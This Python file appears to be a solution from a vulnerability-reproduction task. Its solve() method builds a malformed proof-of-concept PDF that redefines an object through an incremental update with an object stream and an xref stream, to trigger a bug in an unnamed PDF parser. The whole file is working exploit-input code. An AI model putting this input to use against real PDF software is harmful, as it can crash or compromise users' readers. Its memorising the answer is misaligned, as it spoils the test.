import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc_parts = []
        offsets = {}

        # Part 1: PDF Header
        poc_parts.append(b"%PDF-1.5\n")
        poc_parts.append(b"%\xE2\xE3\xCF\xD3\n")

        # Part 2: Initial objects
        current_offset = len(b"".join(poc_parts))
        offsets[1] = current_offset
        poc_parts.append(b"1 0 obj <</Type/Catalog/Pages 2 0 R/VulnObject 4 0 R>> endobj\n")

        current_offset = len(b"".join(poc_parts))
        offsets[2] = current_offset
        poc_parts.append(b"2 0 obj <</Type/Pages/Count 1/Kids[3 0 R]>> endobj\n")

        current_offset = len(b"".join(poc_parts))
        offsets[3] = current_offset
        poc_parts.append(b"3 0 obj <</Type/Page/Parent 2 0 R>> endobj\n")

        # First definition of our target object (ID 4).
        current_offset = len(b"".join(poc_parts))
        offsets[4] = current_offset
        poc_parts.append(b"4 0 obj << /Version 1 >> endobj\n")

        # Part 3: Initial XRef Table and Trailer
        xref1_offset = len(b"".join(poc_parts))
        xref1_table = (
            b"xref\n"
            b"0 5\n"
            b"0000000000 65535 f \n"
            f"{offsets[1]:010d} 00000 n \n".encode() +
            f"{offsets[2]:010d} 00000 n \n".encode() +
            f"{offsets[3]:010d} 00000 n \n".encode() +
            f"{offsets[4]:010d} 00000 n \n".encode()
        )
        poc_parts.append(xref1_table)

        trailer1 = b"trailer\n<</Size 5/Root 1 0 R>>\n"
        poc_parts.append(trailer1)
        poc_parts.append(b"startxref\n")
        poc_parts.append(str(xref1_offset).encode())
        poc_parts.append(b"\n%%EOF\n")

        # Part 4: Incremental Update with Object and XRef Streams
        
        # Object Stream (ID 5) containing the second definition of object 4.
        obj_stream_index = b"4 0 "
        obj_stream_obj_def = b"<< /Version 2 >>"
        obj_stream_content = obj_stream_index + obj_stream_obj_def
        compressed_stream_content = zlib.compress(obj_stream_content)

        current_offset = len(b"".join(poc_parts))
        offsets[5] = current_offset
        obj5_dict = (
            f"<</Type/ObjStm/N 1/First {len(obj_stream_index)} "
            f"/Length {len(compressed_stream_content)}/Filter/FlateDecode>>"
        ).encode()
        poc_parts.append(b"5 0 obj\n" + obj5_dict + b"\nstream\n")
        poc_parts.append(compressed_stream_content)
        poc_parts.append(b"\nendstream\nendobj\n")

        # XRef Stream (ID 6) describing the incremental update.
        w_type, w_field2, w_field3 = 1, 4, 2

        # Entry for obj 4: type 2 (compressed), in object stream 5, at index 0.
        xref_entry_4 = b"\x02" + struct.pack(">I", 5) + struct.pack(">H", 0)
        # Entry for obj 5: type 1 (normal), at its calculated offset, generation 0.
        xref_entry_5 = b"\x01" + struct.pack(">I", offsets[5]) + struct.pack(">H", 0)
        
        xref_stream_data = xref_entry_4 + xref_entry_5

        current_offset = len(b"".join(poc_parts))
        offsets[6] = current_offset
        xref_stream_dict = (
            f"<</Type/XRef/Size 7/Root 1 0 R"
            f"/W [{w_type} {w_field2} {w_field3}]"
            f"/Index [4 2]/Prev {xref1_offset}"
            f"/Length {len(xref_stream_data)}>>"
        ).encode()
        poc_parts.append(b"6 0 obj\n" + xref_stream_dict + b"\nstream\n")
        poc_parts.append(xref_stream_data)
        poc_parts.append(b"\nendstream\nendobj\n")

        # Part 5: Final Trailer pointing to the new XRef Stream
        poc_parts.append(b"startxref\n")
        poc_parts.append(str(offsets[6]).encode())
        poc_parts.append(b"\n%%EOF\n")

        return b"".join(poc_parts)